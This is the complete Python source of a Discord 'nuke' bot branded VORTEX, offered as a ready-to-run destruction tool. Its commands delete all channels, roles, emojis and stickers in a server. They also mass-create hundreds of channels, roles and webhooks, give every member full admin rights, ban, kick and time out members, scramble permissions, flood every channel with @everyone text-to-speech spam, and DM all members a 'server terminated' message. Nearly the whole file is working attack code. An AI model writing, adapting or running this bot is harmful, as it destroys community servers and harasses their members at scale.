import os
import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from datetime import datetime, timedelta
import random
from aiohttp import web

class Config:
    TOKEN = os.environ.get("DISCORD_TOKEN", "")
    PREFIX = "/"
    WHITELIST = []
    SPAM_MESSAGE = ("@everyone " * 90) + "**VORTEX OBLITERATED THIS SERVER** https://discord.gg/vortex"
    SPAM_COUNT = 100
    TEXT_TO_SPEECH = True
    DM_MESSAGE = "🔴 YOUR SERVER HAS BEEN TERMINATED BY VORTEX NUKE BOT 🔴\nAll channels, roles, and members wiped."
    CHANNEL_NAME = "vortex-nuked"
    CHANNELS_COUNT = 500
    NEW_CHANNEL_NAME = "rekt"
    VOICE_CHANNELS_COUNT = 200
    VOICE_CHANNEL_NAME = "VOID"
    CATEGORY_NAME = "ABYSS"
    CATEGORIES_COUNT = 50
    THREAD_COUNT = 50
    THREAD_NAME = "purge-thread"
    NSFW_CHANNEL_NAME = "18plus-destroyed"
    SLOWMODE_DURATION = 0
    ROLE_NAME = "vortex-slave"
    ROLES_COUNT = 500
    NEW_ROLE_NAME = "zombie"
    ADMIN_ROLE_NAME = "GOD-EMPEROR"
    SERVER_NAME = "☠️ VORTEX OBLITERATED ☠️"
    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"
    NICKNAME = "TERMINATED"
    TIMEOUT_DURATION = 28
    WEBHOOK_NAME = "vortex-ghost"
    WEBHOOK_COUNT = 50
    WEBHOOK_RENAME = "spectre"
    INVITE_COUNT = 50
    PIN_SPAM_COUNT = 50
    MOVE_VOICE_CHANNEL_NAME = "EXECUTION_CHAMBER"
    CHAOS_PERMISSIONS = [True, False, None, True, False, None, True]

config = Config()
intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
bot.remove_command("help")

def is_whitelisted(ctx):
    return True if not config.WHITELIST else ctx.author.id in config.WHITELIST

async def download_image(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=5) as response:
                if response.status == 200:
                    return await response.read()
    except:
        pass
    return None

def mention_all():
    return discord.AllowedMentions(everyone=True, roles=True, users=True)

@bot.event
async def on_ready():
    print(f"✅ VORTEX NUKE ONLINE | {bot.user} | {len(bot.guilds)} servers")
    await bot.change_presence(activity=discord.Game(name="/help | VORTEX DESTROY"))

@bot.event
async def on_command(ctx):
    if is_whitelisted(ctx):
        try:
            await ctx.message.delete()
        except:
            pass

@bot.check
async def globally_check_dm(ctx):
    return ctx.guild is not None

@bot.command()
async def mega_nuke(ctx):
    if not is_whitelisted(ctx): return
    guild = ctx.guild
    await ctx.send("💀 INITIATING MEGA NUKE...", delete_after=2, allowed_mentions=mention_all())
    
    for channel in guild.channels:
        try: await channel.delete()
        except: pass
    for role in guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass
    for emoji in guild.emojis:
        try: await emoji.delete()
        except: pass
    for sticker in guild.stickers:
        try: await sticker.delete()
        except: pass
    
    tasks = []
    for i in range(500):
        tasks.append(guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    tasks = []
    for i in range(200):
        tasks.append(guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    tasks = []
    for i in range(50):
        tasks.append(guild.create_category_channel(f"{config.CATEGORY_NAME}-{i}"))
        if len(tasks) >= 20:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    tasks = []
    for i in range(500):
        tasks.append(guild.create_role(name=f"{config.ROLE_NAME}-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    admin_role = await guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
    for member in guild.members:
        try:
            await member.add_roles(admin_role)
        except:
            pass
        await asyncio.sleep(0.01)
    
    for member in guild.members:
        try:
            await member.edit(nick=config.NICKNAME)
        except:
            pass
        await asyncio.sleep(0.01)
    
    for member in guild.members:
        if member != bot.user:
            try:
                await member.timeout(timedelta(days=28))
            except:
                pass
            await asyncio.sleep(0.01)
    
    for channel in guild.text_channels:
        for _ in range(100):
            try:
                await channel.send(config.SPAM_MESSAGE, tts=True, allowed_mentions=mention_all())
            except:
                pass
            await asyncio.sleep(0.005)
    
    for channel in guild.text_channels:
        for _ in range(50):
            try:
                await channel.create_webhook(name=f"{config.WEBHOOK_NAME}-{random.randint(1,99999)}")
            except:
                pass
            await asyncio.sleep(0.01)
    
    for channel in guild.text_channels:
        for _ in range(50):
            try:
                await channel.create_invite(max_uses=1)
            except:
                pass
            await asyncio.sleep(0.01)
    
    for channel in guild.text_channels:
        try:
            msgs = [m async for m in channel.history(limit=100)]
            for msg in random.sample(msgs, min(50, len(msgs))):
                try:
                    await msg.pin()
                except:
                    pass
                await asyncio.sleep(0.01)
        except:
            pass
    
    await ctx.send("✅ MEGA NUKE COMPLETE. 500+ CHANNELS, 500+ ROLES, SPAM FLOOD.", delete_after=5, allowed_mentions=mention_all())

@bot.command()
async def hyper_spam(ctx):
    if not is_whitelisted(ctx): return
    for _ in range(2000):
        try:
            await ctx.send(config.SPAM_MESSAGE + f" [{random.randint(1,99999)}]", tts=True, allowed_mentions=mention_all())
        except:
            pass
        await asyncio.sleep(0.002)

@bot.command()
async def global_spam(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        for _ in range(200):
            try:
                await channel.send(config.SPAM_MESSAGE + " 🔥", tts=True, allowed_mentions=mention_all())
            except:
                pass
            await asyncio.sleep(0.002)

@bot.command()
async def create_army(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for i in range(500):
        tasks.append(ctx.guild.create_role(name=f"army-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    tasks = []
    for i in range(500):
        tasks.append(ctx.guild.create_text_channel(f"base-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send("✅ ARMY DEPLOYED: 500 roles, 500 channels", delete_after=3, allowed_mentions=mention_all())

@bot.command()
async def voice_flood(ctx):
    if not is_whitelisted(ctx): return
    tasks = []
    for i in range(300):
        tasks.append(ctx.guild.create_voice_channel(f"voice-void-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send("✅ 300 VOICE CHANNELS CREATED", delete_after=3, allowed_mentions=mention_all())

@bot.command()
async def webhook_tsunami(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        for _ in range(50):
            try:
                await channel.create_webhook(name=f"tsunami-{random.randint(1,99999)}")
            except:
                pass
            await asyncio.sleep(0.005)
    await ctx.send("✅ WEBHOOK TSUNAMI DEPLOYED", delete_after=3, allowed_mentions=mention_all())

@bot.command()
async def total_anarchy(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    perms = discord.PermissionOverwrite()
                    perms.send_messages = random.choice([True, False, None])
                    perms.view_channel = random.choice([True, False, None])
                    perms.manage_messages = random.choice([True, False, None])
                    perms.attach_files = random.choice([True, False, None])
                    perms.read_message_history = random.choice([True, False, None])
                    await channel.set_permissions(role, overwrite=perms)
                except:
                    pass
            await asyncio.sleep(0.005)
    roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
    random.shuffle(roles)
    for pos, role in enumerate(roles, 1):
        try:
            await role.edit(position=pos)
        except:
            pass
    await ctx.send("✅ TOTAL ANARCHY IMPOSED", delete_after=3, allowed_mentions=mention_all())

@bot.command()
async def purge_all_pins(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            pins = await channel.pins()
            for msg in pins:
                try:
                    await msg.unpin()
                except:
                    pass
                await asyncio.sleep(0.005)
        except:
            pass
    await ctx.send("✅ ALL PINS REMOVED", delete_after=3, allowed_mentions=mention_all())

@bot.command()
async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 500))
    tasks = []
    for i in range(count):
        tasks.append(ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def croles(ctx, count: int = config.ROLES_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 500))
    tasks = []
    for i in range(count):
        tasks.append(ctx.guild.create_role(name=f"{config.ROLE_NAME}-{i}"))
        if len(tasks) >= 50:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(0.02)
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def dchannels(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
        await asyncio.sleep(0.01)

@bot.command()
async def droles(ctx):
    if not is_whitelisted(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass
            await asyncio.sleep(0.01)

@bot.command()
async def adminall(ctx):
    if not is_whitelisted(ctx): return
    admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
    for member in ctx.guild.members:
        try:
            await member.add_roles(admin_role)
        except:
            pass
        await asyncio.sleep(0.01)

@bot.command()
async def rnickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.edit(nick=config.NICKNAME)
        except:
            pass
        await asyncio.sleep(0.01)

@bot.command()
async def timeoutall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.timeout(timedelta(days=28))
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def banall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban()
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def kickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.kick()
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def spam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 500))
    for _ in range(count):
        try:
            await ctx.send(config.SPAM_MESSAGE, tts=True, allowed_mentions=mention_all())
        except:
            pass
        await asyncio.sleep(0.002)

@bot.command()
async def mspam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 100))
    msg = ("@everyone " * 90) + "**VORTEX OBLITERATED THIS SERVER** https://discord.gg/vortex"
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            for __ in range(6):
                try:
                    await channel.send(msg, tts=True, allowed_mentions=mention_all())
                except:
                    pass
                await asyncio.sleep(0.002)

@bot.command()
async def dmall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.send(config.DM_MESSAGE)
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def nuke(ctx):
    await mega_nuke(ctx)

@bot.command()
async def kill(ctx):
    if not is_whitelisted(ctx): return
    await bot.close()

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(
        title="💀 VORTEX NUKE - MASSIVE",
        description="**MEGA NUKE**: 500 channels, 500 roles, 200 voice, 50 categories, 50 webhooks/channel, 100 spam/channel, pins, invites, admin all, timeout all. **@everyone mention enabled**",
        color=discord.Color.red(),
        timestamp=datetime.now()
    )
    embed.add_field(name="💥 MEGA", value="`mega_nuke` `hyper_spam` `global_spam` `create_army` `voice_flood` `webhook_tsunami` `total_anarchy` `purge_all_pins`", inline=False)
    embed.add_field(name="🔧 STANDARD", value="`nuke` `cchannels` `croles` `dchannels` `droles` `adminall` `rnickall` `timeoutall` `banall` `kickall` `spam` `mspam` `dmall` `kill`", inline=False)
    embed.set_footer(text="VORTEX TEAM | @everyone ping active")
    await ctx.send(embed=embed, allowed_mentions=mention_all())

async def start_web_server():
    app = web.Application()
    async def health(request):
        return web.Response(text="OK")
    app.router.add_get('/', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server on port {port}")

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_web_server())
    bot.run(config.TOKEN)